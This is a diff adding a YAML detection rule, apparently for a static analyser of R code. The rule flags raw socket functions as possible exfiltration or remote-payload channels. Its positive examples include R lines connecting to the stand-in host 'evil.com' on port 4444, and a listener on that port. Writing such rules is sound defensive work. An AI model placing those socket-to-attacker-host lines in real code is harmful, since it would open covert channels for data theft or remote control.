@@ -1,0 +1,41 @@
+name: socket_pattern
+version: "0.1.0"
+type: warning
+attck:
+  - T1041
+  - T1095
+  - T1195.002
+message: >-
+  These functions open a raw network socket, which may be used to exfiltrate
+  data or receive a remote payload outside the usual HTTP clients.
+xpath: >-
+  //SYMBOL_FUNCTION_CALL[
+    (
+      text() = 'socketConnection' or text() = 'make.socket'
+      or text() = 'serverSocket' or text() = 'socketAccept'
+    )
+    and not(preceding-sibling::OP-DOLLAR)
+    and not(preceding-sibling::OP-AT)
+  ]
+positive_examples:
+  - |
+    socketConnection(host = "evil.com", port = 4444)
+  - |
+    con <- socketConnection("evil.com", 4444, blocking = TRUE)
+  - |
+    base::socketConnection("evil.com", 4444)
+  - |
+    make.socket("evil.com", 4444)
+  - |
+    srv <- serverSocket(4444)
+  - |
+    socketAccept(srv)
+negative_examples:
+  - |
+    foo$socketConnection("x")
+  - |
+    foo@socketConnection("x")
+  - |
+    foo$make.socket("x")
+  - |
+    foo@serverSocket(4444)
